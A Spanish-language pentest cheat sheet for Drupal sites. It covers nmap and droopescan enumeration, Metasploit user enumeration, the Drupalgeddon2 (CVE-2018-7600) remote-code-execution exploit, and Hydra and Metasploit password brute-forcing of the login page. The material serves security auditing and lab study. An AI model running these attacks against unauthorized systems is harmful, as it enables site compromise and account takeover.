# 📂 Drupal - CMS

### **🕵️ Identificación de la versión de Drupal y sus componentes.**

```bash
nmap -sV --script http-drupal-enum <url> # Detección de versión de Drupal y módulos.
nmap -sV --script "http-drupal* and not http-drupal-brute" <url> # Escaneo de vulnerabilidades en Drupal.
nmap -sV --script http-drupal-users <url> # Detección de usuarios de Drupal.
nmap --script=http-drupal-enum --script-args http-drupal-enum.root=/ -p 80,443 <URL> # Escaneo completo para confirmar si se está utilizando Drupal.
nmap --script=http-vuln* -p 80,443 <url> # Detectar vulnerabilidades específicas en Drupal y sus módulos.
```

Antes de realizar cualquier escaneo del CMS Drupal, es recomendable revisar ciertos directorios específicos.

**✔️ Check List Drupal:**

* [ ] CHANGELOG.txt

> Si el servicio web no carga correctamente o parece inaccesible, podríamos estar ante un caso de virtual hosting. En ese caso, debemos agregar el dominio correspondiente en nuestro **/etc/hosts**, añadiendo la IP de la web y el dominio al que queremos apuntar, por ejemplo: `10.0.0.10 drupal.htb`.

### **🛠️ Escaneo básico Drupal con Metasploit.**

```bash
use auxiliary/scanner/http/drupal_version # Cargar módulo que vamos a utilizar.
set RHOSTS <url>
set RPORT 80
set TARGETURI /
run
```

### **🕵️ Enumerar Usuarios de Drupal**

```bash
use auxiliary/scanner/http/drupal_users_enum
set RHOSTS <url>
set RPORT 80
set TARGETURI /
run
```

### **🔑 Ataque de fuerza bruta con Metasploit:**

```bash
set RHOSTS <url>
set USERNAME <nombre_usuario> # Aquí le indicamos el nombre de usuario contra el que queramos atentar.
set PASS_FILE /usr/share/wordlists/rockyou.txt # Seleccionamos el diccionario a utilizar.
run
```

> 💡 ¡IMPORTANTE! :&#x20;
>
> El exploit **Drupalgeddon2 (CVE-2018-7600)** afecta a las siguientes versiones de **Drupal**:
>
> * **Drupal 6.x** (todas las versiones)
> * **Drupal 7.x** (todas las versiones antes de **7.58**)
> * **Drupal 8.x** (todas las versiones antes de **8.5.1**).

### **🛠️ Ejecución del exploit Drupalgeddon2 con Metasploit.**

_Drupalgeddon2 es una vulnerabilidad crítica (CVE-2018-7600) que permite la ejecución remota de código en versiones vulnerables de Drupal._

```bash
use exploit/unix/webapp/drupal_drupalgeddon2 # Seleccionamos el exploit a utilizar.
set RHOSTS <url> # Le indicamos la url del objetivo.
set RPORT 80
set TARGETURI /
run # Iniciamos el ataque.
```

Este exploit aprovecha una ejecución arbitraria de código a través de la manipulación de formularios en Drupal.

### **🛠️ Otras herramientas para auditar Drupal.**

#### **🔹 Droopescan**

**Droopescan** es una herramienta especializada en la enumeración y auditoría de sitios web basados en **Drupal**. Permite detectar vulnerabilidades, enumerar usuarios, módulos y temas instalados.

```bash
droopescan scan drupal -u <url_drupal> # Análisis básico del sitio Drupal.
droopescan scan drupal -u <url_drupal> -e plugins, themes # Enumerar módulos y temas instalados.
```

> 💡 Una buena práctica al auditar Drupal es revisar el código fuente de la página web. Ahí podremos encontrar rutas como `/sites/default/files/`, que pueden revelar archivos accesibles o permitir _directory listing_, así como información sobre temas y módulos utilizados.

Si encontramos posibles nombres de usuario durante la auditoría, debemos guardarlos en un archivo **.txt** para consultarlos o utilizarlos como **wordlist** de usuarios.

### **🔑 Fuerza bruta al panel Login de Drupal.**

**Fuerza bruta con Hydra**

```bash
hydra -l <username> -P /usr/share/wordlists/rockyou.txt <url> http-post-form "/user/login:name=^USER^&pass=^PASS^&form_id=user_login:F=Incorrect username or password."
```

Ataque a múltiples usuarios:

```bash
hydra -L <lista_usuarios.txt> -P <diccionario.txt> <url> http-post-form "/user/login:name=^USER^&pass=^PASS^&form_id=user_login:F=Incorrect username or password."
```

🏁 Con esta guía hemos cubierto los pasos necesarios para detectar la versión de Drupal, encontrar módulos, temas, directorios sensibles, buscar paneles de login y realizar fuerza bruta contra estos paneles para intentar obtener acceso.

> 💡 _Más adelante, en la parte de Fuzzing Web y descubrimiento de directorios y subdominios, veremos cómo encontrar posibles rutas sensibles que nos faciliten la obtención de información._
